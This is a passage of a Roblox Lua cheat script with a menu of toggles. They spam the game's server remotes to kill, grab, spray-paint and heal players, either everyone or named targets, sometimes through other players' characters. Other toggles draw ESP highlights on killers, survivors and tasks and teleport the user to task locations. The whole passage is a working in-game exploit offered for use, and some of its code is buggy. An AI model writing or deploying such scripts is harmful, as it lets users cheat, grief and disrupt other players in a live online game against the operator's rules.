				local ohVector31 = v:FindFirstChild("HumanoidRootPart").Position
				lplr.Character.Launcher.Remotes.Shoot:FireServer(ohVector31)
			end
			for i, v in pairs(game:GetService("Workspace").Dead:GetChildren()) do
				if v then
				local ohVector31 = v:FindFirstChild("HumanoidRootPart").Position
				lplr.Character.Launcher.Remotes.Shoot:FireServer(ohVector31)
				end
			end
		elseif Chr:FindFirstChild("Quick slash") then
				for i, v in pairs(game.Workspace.Killers:GetChildren()) do
				local ohInstance1 = v
			
			game.Players.LocalPlayer.Character["Quick slash"].Remotes.Hit:FireServer(ohInstance1)
				end
				for i, v in pairs(game.Workspace.Dead:GetChildren()) do
					if v then
					local ohInstance1 = v
				
				game.Players.LocalPlayer.Character["Quick slash"].Remotes.Hit:FireServer(ohInstance1)
					end
					end
			elseif Chr:FindFirstChild("Windforce") then
				for i, v in pairs(game.Workspace.Killers:GetChildren()) do
					local ohInstance1 = v
				
				game.Players.LocalPlayer.Character["Windforce"].Remotes.Hit:FireServer(ohInstance1)

			end
			for i, v in pairs(game.Workspace.Dead:GetChildren()) do
				if v then
				local ohInstance1 = v
			
			game.Players.LocalPlayer.Character["Windforce"].Remotes.Hit:FireServer(ohInstance1)
				end
		end
		elseif Chr:FindFirstChild("Ban") then
			for i, v in pairs(game.Workspace.Killers:GetChildren()) do
				local ohInstance1 = v
			
			game.Players.LocalPlayer.Character["Ban"].Remotes.Hit:FireServer(ohInstance1)
		end
		for i, v in pairs(game.Workspace.Dead:GetChildren()) do
			if v then
			local ohInstance1 = v
		
		game.Players.LocalPlayer.Character["Ban"].Remotes.Hit:FireServer(ohInstance1)
			end
	end
		end
		task.wait()
	end
end
end
})

-- Label

Spame:AddLabel("Killer Spam Kill")

	-- Dropdown

Spame:AddDropdown({
	Name = "Choose Player",
	Default = "Yourself",
	Options = {"Other Player", "Yourself"},
	Callback = function(Value)
		_G.PlayerChoosed = Value
	end 
})

Spame:AddDropdown({
	Name = "Choose User Team",
	Default = "",
	Options = {"Survivors", "Downed"},
	Callback = function(Value)
		_G.PlayersTeam1 = Value
	end 
})

-- Textbox

Spame:AddTextbox({
	Name = "Put in Player Username (Full)",
	Default = "",
	TextDisappear = false,
	Callback = function(Value)
		_G.PlayerChoosedE = Value
	end	
})
	    -- Toggle		
    
		Spame:AddToggle({
			Name = "Kill Spam",
			Default = false,
			Callback = function(Value)
				_G.KillersP = Value
				function erp()
				if _G.PlayerChoosed == "Yourself" then
				if _G.KillersP == true then
					while _G.KillersP == true do
						for i, v in pairs(game.Workspace[_G.PlayersTeam1]:GetChildren()) do
						local ohInstance1 = v
		
						game.Players.LocalPlayer.Character.Attack.Remotes.Hit:FireServer(ohInstance1)
				end
                task.wait(0.2)
				end
			end
		elseif _G.PlayerChoosed == "Other Player" then
			if _G.KillersP == true then
			for _, o in pairs(game.Workspace.Killers:GetChildren()) do
				while _G.KillersP == true do
					for i, v in pairs(game.Workspace[_G.PlayersTeam1]:GetChildren()) do
					local ohInstance1 = v
	
					o.Attack.Remotes.Hit:FireServer(ohInstance1)
					end
					task.wait(0.2)
				end
			end
		end
		end
	end
	erp()
end
		})
		
-- label


























-- Label

Spame:AddLabel("Remove Effects Reccomended")

-- Toggle

Spame:AddToggle({
	Name = "Remove Heal Effects",
	Default = false,
	Callback = function(Value)
		_G.RemoveHealtEffects = Value
		if _G.RemoveHealtEffects == true then
			while _G.RemoveHealtEffects == true do
				RemoveHealtEffects()
			wait(.0000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
			end
		else
			return true
	end
end    
})

Spame:AddToggle({
	Name = "Remove Grab Effect",
	Default = false,
	Callback = function(Value)
        _G.AutoDoGrab = Value
        while _G.AutoDoGrab do
            task.wait()
            if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Grabgui") then
                game:GetService("Players").LocalPlayer.PlayerGui.Grabgui:Destroy()
             end
        end
  end
})

Spame:AddToggle({
	Name = "Remove SpeedBoost Effects",
	Default = false,
	Callback = function(Value)
		_G.RemoveSpeedBoostEffect = Value
		if _G.RemoveSpeedBoostEffect == true then
			while _G.RemoveSpeedBoostEffect == true do
				RemoveSpeedBoostEffect()
			wait(.0000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
			end
		else
			return true
	end
end    
})
-- Label

local Section = Spame:AddSection({
	Name = "Guest Spray Paint"
})

Spame:AddDropdown({
	Name = "Select Spame Target",
	Default = "",
	Options = {"Everyone", "One Person"},
	Callback = function(Value)
		_G.SprayPaintSpameTarget = Value
	end    
})

Spame:AddDropdown({
	Name = "Select Target",
	Default = "",
	Options = {"Other Person", "Self"},
	Callback = function(Value)
		_G.SprayPaintTarget = Value
	end    
})

Spame:AddDropdown({
	Name = "For Everyone",
	Default = "Expect Self",
	Options = {"No Expections", "Expect Friends And You", "Expect Self", "Expect Survivors And You", "Expect Killers And You"},
	Callback = function(Value)
		_G.SprayPaintExpection = Value
	end    
})

Spame:AddTextbox({
	Name = "Select Player Username or Display Name",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		_G.SelectedSprayPaintUser = Value
        for _, player in pairs(game:GetService("Players"):GetChildren()) do
            if _G.SelectedSprayPaintUser == player.DisplayName then
                _G.Corrected = player
            elseif _G.SelectedSprayPaintUser == player.Name then
                _G.Corrected = player
            end
        end
	end	  
})

Spame:AddToggle({
	Name = "Spam Spray Paint",
	Default = false,
	Callback = function(Value)
        _G.SpamSprayPaint = Value
		while _G.SpamSprayPaint == true do
            if _G.SprayPaintTarget == "Self" then
                local Players = game:GetService("Players")
                local lplr = Players.LocalPlayer
                local lchr = lplr.Character
                if _G.SprayPaintSpameTarget == "Everyone" then
                    if _G.SprayPaintExpection == "Expect Self" then
                        for i, player in pairs(game:GetService("Players"):GetChildren()) do
                            if player == lplr then
                                
                            else
                                if player and player.Character then
                                    local args = {
                                        [1] = player.Character
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))            
                                end 
                            end
                        end
                    elseif _G.SprayPaintExpection == "No Expections" then
                        for i, player in pairs(game:GetService("Players"):GetChildren()) do
                                if player and player.Character then
                                    local args = {
                                        [1] = player.Character
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))            
                            end
                        end
                    elseif _G.SprayPaintExpection == "Expect Friends And You" then
                        for i, player in pairs(game:GetService("Players"):GetChildren()) do
                            if player == lplr then
                                
                            elseif player:IsFriendsWith(lplr.UserId) then
    
                            else
                                if player and player.Character then
                                    local args = {
                                        [1] = player.Character
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))
                                end
                            end
                        end
                        elseif _G.SprayPaintExpection == "Expect Survivors And You" then
                            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                                if player and player.Character then
                                    if player == lcorrect then
                                    
                                    elseif player.Character.Parent == workspace.Survivors then
    
                                    else
                                        local args = {
                                            [1] = player.Character
                                        }
                                        
                                        lchr:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))
                                    end
                                end
                            end
                        else
                            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                                if player and player.Character then
                                    if player == lcorrect then
                                    
                                    elseif player.Character.Parent == workspace.Killers then
    
                                    else
                                        local args = {
                                            [1] = player.Character
                                        }
                                        
                                        lchr:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))
                                    end
                                end
                            end
                        end
                else
                    local plr = game:GetService("Players")[_G.Corrected]
                    if plr and plr.Character then
                        local args = {
                            [1] = plr.Character
                        }
                        
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))
                    end
                end
            else
                local Players = game:GetService("Players")
                local lcorrect = Players.LocalPlayer
                local lchr = lcorrect.Character
                for _, correct in pairs(game:GetService("Players"):GetChildren()) do
                    if correct and correct.Character and correct.Character:FindFirstChild("Spray paint") then
                        if _G.SprayPaintSpameTarget == "Everyone" then
                            if _G.SprayPaintExpection == "Expect Self" then
                                for i, player in pairs(game:GetService("Players"):GetChildren()) do
                                    if player == lcorrect then
                                        
                                    else
                                        if player and player.Character then
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))            
                                        end 
                                    end
                                end
                            elseif _G.SprayPaintExpection == "No Expections" then
                                for i, player in pairs(game:GetService("Players"):GetChildren()) do
                                        if player and player.Character then
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))            
                                    end
                                end
                            elseif _G.SprayPaintExpection == "Expect Friends And You" then
                                for i, player in pairs(game:GetService("Players"):GetChildren()) do
                                    if player == lcorrect then
                                        
                                    elseif player:IsFriendsWith(lcorrect.UserId) then
                        
                                    else
                                        if player and player.Character then
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))
                                        end
                                    end
                                end
                            elseif _G.SprayPaintExpection == "Expect Survivors And You" then
                                for _, player in pairs(game:GetService("Players"):GetChildren()) do
                                    if player and player.Character then
                                        if player == lcorrect then
                                        
                                        elseif player.Character.Parent == workspace.Survivors then
        
                                        else
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))
                                        end
                                    end
                                end
                            else
                                for _, player in pairs(game:GetService("Players"):GetChildren()) do
                                    if player and player.Character then
                                        if player == lcorrect then
                                        
                                        elseif player.Character.Parent == workspace.Killers then
        
                                        else
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))
                                        end
                                    end
                                end
                            end
                        else
                            local plr = game:GetService("Players")[_G.Corrected]
                            if plr and plr.Character then
                                local args = {
                                    [1] = plr.Character
                                }
                                
                                correct.Character:FindFirstChild("Spray paint").Remotes.Hit:FireServer(unpack(args))
                            end
                        end
                    end
                end
            end
            task.wait()
        end
	end
})



local Section = Spame:AddSection({
	Name = "1x1x1x1 Spam"
})

Main:AddSlider({
	Name = "Cooldown For Spam",
	Min = 0,
	Max = 1,
	Default = 0,
	Color = Color3.fromRGB(17, 0, 255),
	Increment = 0.1,
	ValueName = "Cooldown",
	Callback = function(Value)
		_G.SpamCooldown1 = Value
	end    
})

Spame:AddToggle({
	Name = "Auto Complete Grab",
	Default = false,
	Callback = function(Value)
        _G.AutoDoGrab = Value
        while _G.AutoDoGrab do
            task.wait()
            if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Grabgui") and game:GetService("Players").LocalPlayer.PlayerGui.Grabgui:FindFirstChild("Success") then
                game:GetService("Players").LocalPlayer.PlayerGui.Grabgui.Success:FireServer()
             end
        end
  end
})

Spame:AddDropdown({
	Name = "Select Spame Target",
	Default = "",
	Options = {"Everyone", "One Person"},
	Callback = function(Value)
		_G.GrabSpameTarget = Value
	end    
})

_G.GrabTarget = "Other Person"

Spame:AddDropdown({
	Name = "For Everyone",
	Default = "Expect Self",
	Options = {"No Expections", "Expect Friends And You", "Expect Self", "Expect Survivors And You", "Expect Killers And You"},
	Callback = function(Value)
		_G.GrabExpection = Value
	end    
})

Spame:AddTextbox({
	Name = "Select Player Username or Display Name",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		_G.SelectedGrabUser = Value
        for _, player in pairs(game:GetService("Players"):GetChildren()) do
            if _G.SelectedGrabUser == player.DisplayName then
                _G.Corrected = player
            elseif _G.SelectedGrabUser == player.Name then
                _G.Corrected = player
            end
        end
	end	  
})

Spame:AddToggle({
	Name = "Spam Grab",
	Default = false,
	Callback = function(Value)
        _G.SpamGrab = Value
		while _G.SpamGrab == true do
            if _G.GrabTarget == "Self" then
                local Players = game:GetService("Players")
                local lplr = Players.LocalPlayer
                local lchr = lplr.Character
                if _G.GrabSpameTarget == "Everyone" then
                    if _G.GrabExpection == "Expect Self" then
                        for i, player in pairs(game:GetService("Players"):GetChildren()) do
                            if player == lplr then
                                
                            else
                                if player and player.Character then
                                    local args = {
                                        [1] = player.Character
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))            
                                end 
                            end
                        end
                    elseif _G.GrabExpection == "No Expections" then
                        for i, player in pairs(game:GetService("Players"):GetChildren()) do
                                if player and player.Character then
                                    local args = {
                                        [1] = player.Character
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))            
                            end
                        end
                    elseif _G.GrabExpection == "Expect Friends And You" then
                        for i, player in pairs(game:GetService("Players"):GetChildren()) do
                            if player == lplr then
                                
                            elseif player:IsFriendsWith(lplr.UserId) then
    
                            else
                                if player and player.Character then
                                    local args = {
                                        [1] = player.Character
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))
                                end
                            end
                        end
                        elseif _G.GrabExpection == "Expect Survivors And You" then
                            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                                if player and player.Character then
                                    if player == lcorrect then
                                    
                                    elseif player.Character.Parent == workspace.Survivors then
    
                                    else
                                        local args = {
                                            [1] = player.Character
                                        }
                                        
                                        lchr.Grab.Remotes.Grab:FireServer(unpack(args))
                                    end
                                end
                            end
                        else
                            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                                if player and player.Character then
                                    if player == lchr then
                                    
                                    elseif player.Character.Parent == workspace.Killers then
    
                                    else
                                        local args = {
                                            [1] = player.Character
                                        }
                                        
                                        lchr.Grab.Remotes.Grab:FireServer(unpack(args))
                                    end
                                end
                            end
                        end
                else
                    local plr = game:GetService("Players")[_G.Corrected]
                    if plr and plr.Character then
                        local args = {
                            [1] = plr.Character
                        }
                        
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))
                    end
                end
            else
                local Players = game:GetService("Players")
                local lcorrect = Players.LocalPlayer
                local lchr = lcorrect.Character
                for _, correct in pairs(game:GetService("Players"):GetChildren()) do
                    if correct and correct.Character and correct.Character:FindFirstChild("Grab") then
                        if _G.GrabSpameTarget == "Everyone" then
                            if _G.GrabExpection == "Expect Self" then
                                for i, player in pairs(game:GetService("Players"):GetChildren()) do
                                    if player == lcorrect then
                                        
                                    else
                                        if player and player.Character then
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))            
                                        end 
                                    end
                                end
                            elseif _G.GrabExpection == "No Expections" then
                                for i, player in pairs(game:GetService("Players"):GetChildren()) do
                                        if player and player.Character then
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))            
                                    end
                                end
                            elseif _G.GrabExpection == "Expect Friends And You" then
                                for i, player in pairs(game:GetService("Players"):GetChildren()) do
                                    if player == lcorrect then
                                        
                                    elseif player:IsFriendsWith(lcorrect.UserId) then
                        
                                    else
                                        if player and player.Character then
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))
                                        end
                                    end
                                end
                            elseif _G.GrabExpection == "Expect Survivors And You" then
                                for _, player in pairs(game:GetService("Players"):GetChildren()) do
                                    if player and player.Character then
                                        if player == lcorrect then
                                        
                                        elseif player.Character.Parent == workspace.Survivors then
        
                                        else
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))
                                        end
                                    end
                                end
                            else
                                for _, player in pairs(game:GetService("Players"):GetChildren()) do
                                    if player and player.Character then
                                        if player == lcorrect then
                                        
                                        elseif player.Character.Parent == workspace.Killers then
        
                                        else
                                            local args = {
                                                [1] = player.Character
                                            }
                                            
                                            correct.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))
                                        end
                                    end
                                end
                            end
                        else
                            local plr = game:GetService("Players")[_G.Corrected]
                            if plr and plr.Character then
                                local args = {
                                    [1] = plr.Character
                                }
                                
                                correct.Character:FindFirstChild("Grab").Remotes.Grab:FireServer(unpack(args))
                            end
                        end
                    end
                end
            end
            task.wait(_G.SpamCooldown1)
        end
	end
})

-- Label


Spame:AddLabel("GodMode JaneDoe OP")

-- Textbox

Spame:AddTextbox({
	Name = "Put in Player Username For Spam (Full)",
	Default = "",
	TextDisappear = false,
	Callback = function(Value)
		_G.JaneDoeVictim = Value
	end	
})

-- Dropdown

Spame:AddDropdown({
	Name = "Choose User Team",
	Default = "",
	Options = {"Survivors", "Downed", "Killers", "Dead"},
	Callback = function(Value)
		_G.JaneDoeSelection = Value
	end 
})

-- Dropdown

Spame:AddDropdown({
	Name = "Choose Player",
	Default = "Yourself",
	Options = {"Other Player", "Yourself"},
	Callback = function(Value)
		_G.JaneDoeSelectionB = Value
	end 
})

-- Toggle

Spame:AddToggle({
	Name = "Heal Spam",
	Default = false,
	Callback = function(Value)
		_G.JaneDoe = Value
		if _G.JaneDoeSelectionB == "Yourself" then
			if _G.JaneDoe == true then
				while _G.JaneDoe == true do
					game.Players.LocalPlayer.Character.Medkit.Remotes.Use:FireServer()
					
					local ohInstance1 = workspace[_G.JaneDoeSelection][_G.JaneDoeVictim]
					
					game.Players.LocalPlayer.Character.Medkit.Remotes.Use:FireServer(ohInstance1)

					wait()
				end
			end
		elseif _G.JaneDoeSelectionB == "Other Player" then
			for _, player in pairs(game.Players:GetChildren()) do
				if player.Character:FindFirstChild("Medkit") then
		if _G.JaneDoe == true then
			while _G.JaneDoe == true do
				player.Character.Medkit.Remotes.Use:FireServer()
				
				local ohInstance1 = workspace[_G.JaneDoeSelection][_G.JaneDoeVictim]
				
				player.Character.Medkit.Remotes.Use:FireServer(ohInstance1)
				wait()
			end
		end
		end
		end
		end
	end
})

Spame:AddToggle({
	Name = "Heal Spam Yourself",
	Default = false,
	Callback = function(Value)
		_G.JaneDoeSelf = Value
		if _G.JaneDoeSelectionB == "Yourself" then
			if _G.JaneDoeSelf == true then
				while _G.JaneDoeSelf == true do
					game.Players.LocalPlayer.Character.Medkit.Remotes.Use:FireServer()
					
					local ohInstance1 = game.Players.LocalPlayer.Character
					
					game.Players.LocalPlayer.Character.Medkit.Remotes.Use:FireServer(ohInstance1)
					wait(.000000000000000000000000000000000000000000000000001)
				end
			end
		elseif _G.JaneDoeSelectionB == "Other Player" then
		if _G.JaneDoeSelf == true then
			while _G.JaneDoeSelf == true do
				game.Players[_G.JaneDoeSelectionE].Character.Medkit.Remotes.Use:FireServer()
				
				local ohInstance1 = game.Players.LocalPlayer.Character
				
				game.Players[_G.JaneDoeSelectionE].Character.Medkit.Remotes.Use:FireServer(ohInstance1)
				wait(.000000000000000000000000000000000000000000000000001)
			end
		end
	end
end    
})

Spame:AddToggle({
	Name = "Speed Boost Team Spam",
	Default = false,
	Callback = function(Value)
		_G.JaneDoeTeam = Value
		if _G.JaneDoeSelectionB == "Yourself" then
			if _G.JaneDoeTeam == true then
				while _G.JaneDoeTeam == true do
					local ohString1 = "Use"
					
					game.Players.LocalPlayer.Character.Teamboost.Remotes.Use:FireServer(ohString1)
					wait(.000000000000000000000000000000000000000000000000001)
				end
			end
		elseif _G.JaneDoeSelectionB == "Other Player" then
			if _G.JaneDoeTeam == true then
				while _G.JaneDoeTeam == true do
				for i, v in pairs(game.Players:GetChildren()) do
					if v.Character:FindFirstChild("Teamboost") then
					local ohString1 = "Use"
					
					v.Remotes.Use:FireServer(ohString1)
					wait(.000000000000000000000000000000000000000000000000001)
				end
			end
		end
	end
end    
end
})

-- Label

Spame:AddLabel("Godmode Shedlesky OP")

-- Dropdown

Spame:AddDropdown({
	Name = "Choose Player",
	Default = "Yourself",
	Options = {"Other Player", "Yourself"},
	Callback = function(Value)
		_G.ShedletskyPlayer = Value
	end 
})

-- Toggle

Spame:AddToggle({
	Name = "Heal Spam",
	Default = false,
	Callback = function(Value)
		_G.Shedletsky = Value
		if _G.ShedletskyPlayer == "Yourself" then
			if _G.Shedletsky == true then
				while _G.Shedletsky == true do
					local ohString1 = "Equip"
					
					game.Players.LocalPlayer.Character.Chicken.Remotes.Use:FireServer(ohString1)
					
					local ohString1 = "Heal"
					
					game.Players.LocalPlayer.Character.Chicken.Remotes.Use:FireServer(ohString1)
					wait(.000000000000000000000000000000000000000000000000001)
				end
			end
		elseif _G.ShedletskyPlayer == "Other Player" then
			if _G.Shedletsky == true then
				while _G.Shedletsky == true do
					for i, v in pairs(game.Players:GetChildren()) do
						if v.Character:FindFirstChild("Chicken") then
					local ohString1 = "Equip"
					
					game.Players[_G.ShedletskyPlayeer].Character.Chicken.Remotes.Use:FireServer(ohString1)
					
					local ohString1 = "Heal"
					
					game.Players[_G.ShedletskyPlayeer].Character.Chicken.Remotes.Use:FireServer(ohString1)
					wait(.000000000000000000000000000000000000000000000000001)
				end
			end
		end
	end
end    
end
})

-- Label

Misc:AddLabel("Survival Stuff")

-- Toggle
-- Trud

local highlightS = Instance.new("Highlight")
local highlightT = Instance.new("Highlight")
local highlightDW = Instance.new("Highlight")
local highlightDD = Instance.new("Highlight")
local highlightK = Instance.new("Highlight")
local highlightSP = Instance.new("Highlight")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local lplr = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
highlightS.FillColor = Color3.fromRGB(98, 255, 0)
highlightS.OutlineColor = highlightS.FillColor
highlightS.Name = "highlightS"
highlightK.FillColor = Color3.fromRGB(255, 0, 0)
highlightK.OutlineColor = highlightK.FillColor
highlightK.Name = "highlightK"
highlightDW.FillColor = Color3.fromRGB(255, 251, 0)
highlightDW.Name = "highlightDW"
highlightDW.OutlineColor = highlightDW.FillColor
highlightDD.FillColor = Color3.fromRGB(255, 85, 0)
highlightDD.OutlineColor = highlightDD.FillColor
highlightDD.Name = "highlightDD"
highlightT.FillColor = Color3.fromRGB(0, 26, 255)
highlightT.OutlineColor = highlightT.FillColor
highlightT.Name = "highlightT"
highlightSP.FillColor = Color3.fromRGB(255, 255, 255)
highlightSP.OutlineColor = highlightSP.FillColor
highlightSP.Name = "highlightSP"

function ESPPLAYERS()
    if _G.Esp == true then
        for _, Player in pairs(game:GetService("Players"):GetChildren()) do
            if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                if Player.Character.Parent == Workspace then
                    local highlightClone = highlightSP:Clone()
                    highlightClone.Adornee = Player.Character
                    highlightClone.Parent = Player.Character.HumanoidRootPart
                end
            end
        end
        for _, Player in pairs(Workspace.Killers:GetChildren()) do
            if Player and Player:FindFirstChild("HumanoidRootPart") and not Player.HumanoidRootPart:FindFirstChild("highlightK") then
                if Player == lplr.Character then
                    
                else
                    if Player.HumanoidRootPart:FindFirstChild("highlightDW") then
                        Player.HumanoidRootPart:FindFirstChild("highlightDW"):Destroy()
                        local highlightClone = highlightK:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    elseif Player.HumanoidRootPart:FindFirstChild("highlightK") then
                        Player.HumanoidRootPart:FindFirstChild("highlightK"):Destroy()
                        local highlightClone = highlightK:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    elseif Player.HumanoidRootPart:FindFirstChild("highlightS") then
                        Player.HumanoidRootPart:FindFirstChild("highlightS"):Destroy()
                        local highlightClone = highlightK:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    else
                        local highlightClone = highlightK:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    end
                end
            end
        end    
        for _, Player in pairs(Workspace.Survivors:GetChildren()) do
            if Player and Player:FindFirstChild("HumanoidRootPart") and not Player.HumanoidRootPart:FindFirstChild("highlightS") then
                if Player == lplr.Character then
                    
                else
                    if Player.HumanoidRootPart:FindFirstChild("highlightDW") then
                        Player.HumanoidRootPart:FindFirstChild("highlightDW"):Destroy()
                        local highlightClone = highlightS:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    elseif Player.HumanoidRootPart:FindFirstChild("highlightK") then
                        Player.HumanoidRootPart:FindFirstChild("highlightK"):Destroy()
                        local highlightClone = highlightS:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    else
                        local highlightClone = highlightS:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    end
                end
            end
        end    
        for _, Player in pairs(Workspace.Downed:GetChildren()) do
            if Player and Player:FindFirstChild("HumanoidRootPart") and not Player.HumanoidRootPart:FindFirstChild("highlightDW") then
                if Player == lplr.Character then
                    
                else
                    if Player.HumanoidRootPart:FindFirstChild("highlightDW") then
                        local highlightClone = highlightDW:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    elseif Player.HumanoidRootPart:FindFirstChild("highlightK") then
                        Player.HumanoidRootPart:FindFirstChild("highlightK"):Destroy()
                        local highlightClone = highlightDW:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    elseif Player.HumanoidRootPart:FindFirstChild("highlightS") then
                        Player.HumanoidRootPart:FindFirstChild("highlightS"):Destroy()
                        local highlightClone = highlightDW:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    else
                        local highlightClone = highlightDW:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    end
                end
            end
        end
        for _, Player in pairs(Workspace.Dead:GetChildren()) do
            if Player == lplr.Character then
                
            else
                if Player and Player:FindFirstChild("HumanoidRootPart") and not Player.HumanoidRootPart:FindFirstChild("highlightDD") then
                    if Player.HumanoidRootPart:FindFirstChild("highlightDW") then
                        Player.HumanoidRootPart:FindFirstChild("highlightDW"):Destroy()
                        local highlightClone = highlightDD:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    elseif Player.HumanoidRootPart:FindFirstChild("highlightK") then
                        Player.HumanoidRootPart:FindFirstChild("highlightK"):Destroy()
                        local highlightClone = highlightDD:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    elseif Player.HumanoidRootPart:FindFirstChild("highlightS") then
                        Player.HumanoidRootPart:FindFirstChild("highlightS"):Destroy()
                        local highlightClone = highlightDD:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    else
                        local highlightClone = highlightDD:Clone()
                        highlightClone.Adornee = Player
                        highlightClone.Parent = Player.HumanoidRootPart
                    end
                end
            end
        end
        for _, Task in pairs(Workspace:WaitForChild("Map"):WaitForChild("Tasks"):WaitForChild("Current"):GetChildren()) do
            if Task and Task:FindFirstChild("Mainpart") and not Task.Mainpart:FindFirstChild("highlightT") then
                local highlightClone = highlightT:Clone()
                highlightClone.Adornee = Task
                highlightClone.Parent = Task.Mainpart
            end
        end
    else
        for _, plr in pairs(workspace.Killers:GetChildren()) do
            pcall(function()
                for _, high in pairs(plr.HumanoidRootPart:GetChildren()) do
                    if high:IsA("Highlight") then
                        high:Destroy()
                    end
                end
            end)
        end
        for _, plr in pairs(workspace.Dead:GetChildren()) do
            pcall(function()
                for _, high in pairs(plr.HumanoidRootPart:GetChildren()) do
                    if high:IsA("Highlight") then
                        high:Destroy()
                    end
                end
            end)
        end
        for _, plr in pairs(workspace.Downed:GetChildren()) do
            pcall(function()
                for _, high in pairs(plr.HumanoidRootPart:GetChildren()) do
                    if high:IsA("Highlight") then
                        high:Destroy()
                    end
                end
            end)
        end
        for _, plr in pairs(workspace.Survivors:GetChildren()) do
            pcall(function()
                for _, high in pairs(plr.HumanoidRootPart:GetChildren()) do
                    if high:IsA("Highlight") then
                        high:Destroy()
                    end
                end
            end)
        end
        for _, Player in pairs(game:GetService("Players"):GetChildren()) do
            if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                if Player.Character.Parent == Workspace then
                    for _, high in pairs(Player.Character.HumanoidRootPart:GetChildren()) do
                        if high:IsA("Highlight") then
                            high:Destroy()
                        end
                    end
                end
            end
        end
        for _, task in pairs(workspace:WaitForChild("Map"):WaitForChild("Tasks"):WaitForChild("Current"):GetChildren()) do
            pcall(function()
                for _, high in pairs(task.Mainpart:GetChildren()) do
                    if high:IsA("Highlight") then
                        high:Destroy()
                    end
                end                
            end)
        end
    end
end

RunService.RenderStepped:Connect(function(deltaTime)
    ESPPLAYERS()
end)


	Misc:AddToggle({
		Name = "Esp (Reccomended)",
		Default = false,
		Callback = function(Value)
			_G.Esp = Value

	end    
	})

	Misc:AddToggle({
		Name = "Tp to Tasks(Reccomended)",
		Default = false,
		Callback = function(Value)
			_G.Tasks = Value
			function DoTasks()
				local CFrameTp = game.Workspace:WaitForChild("Map"):WaitForChild("Tasks"):WaitForChild("Current"):GetChildren()
				for i, v in pairs(CFrameTp) do
					while _G.Tasks do
						if not v or not v:FindFirstChild("Mainpart") then
							task.wait(0.1)
							return DoTasks()
						end
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = v.Mainpart.CFrame
					task.wait()
				end
			end				
			end
			DoTasks()
	end    
	})

-- Destroy GUI

Misc:AddButton({
	Name = "Destroy GUI",
	Callback = function()
